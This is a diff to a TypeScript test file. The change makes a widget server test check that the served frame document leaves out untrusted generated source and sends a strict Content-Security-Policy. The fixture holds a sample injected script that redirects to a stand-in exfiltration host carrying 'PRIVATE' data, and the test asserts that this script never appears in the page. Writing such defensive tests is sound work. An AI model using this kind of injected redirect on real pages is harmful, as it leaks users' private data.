@@ -5,8 +5,8 @@ import { randomUUID } from "node:crypto";
 import { tmpdir } from "node:os";
 import { Store } from "../packages/storage/store.ts";
 import { Service } from "../packages/core/service.ts";
-import { buildServer } from "../apps/server/server.ts";
-import { widgetDefinition, widgetDocument } from "../packages/core/widgets.ts";
+import { buildServer, buildWidgetServer } from "../apps/server/server.ts";
+import { widgetDefinition } from "../packages/core/widgets.ts";
 import { WIDGET_WORKER_CSP } from "../packages/widgets/protocol.ts";
 import type { RuntimeAdapter } from "../packages/contracts/index.ts";
 const cleanups:(()=>Promise<void>)[]=[];
@@ -94,9 +94,13 @@ it("serves a credential-free worker asset with independent network and worker de
  expect(response.headers["x-content-type-options"]).toBe("nosniff");
  if(response.statusCode===200)expect(response.headers["content-type"]).toContain("text/javascript");
 });
-it("never embeds generated source in the trusted frame document",()=>{
+it("never embeds generated source in the trusted frame document",async()=>{
+ const {service,store}=await setup();
  const widget=widgetDefinition({html:'<script>location="https://exfil.invalid/PRIVATE"</script>',inputSchema:{},eventSchema:{},stateSchema:{}});
- const document=widgetDocument(widget,"artifact");
+ store.internal('fixture.widget',null,()=>store.put('artifactVersion','artifact@1','thread',{id:'artifact',widget}));
+ const app=await buildWidgetServer(service,new Map([['mount',{artifactId:'artifact',revision:1,expiresAt:Date.now()+10_000}]]));cleanups.push(()=>app.close());
+ const response=await app.inject({url:'/widget/artifact/1?ticket=mount',headers:{host:'127.0.0.1:4318'}}),document=response.body;
+ expect(response.statusCode).toBe(200);expect(response.headers['content-security-policy']).toContain("default-src 'none'");
  expect(document).not.toContain("exfil.invalid");expect(document).not.toContain("PRIVATE");
  expect(document).toContain("Content-Security-Policy");
 });
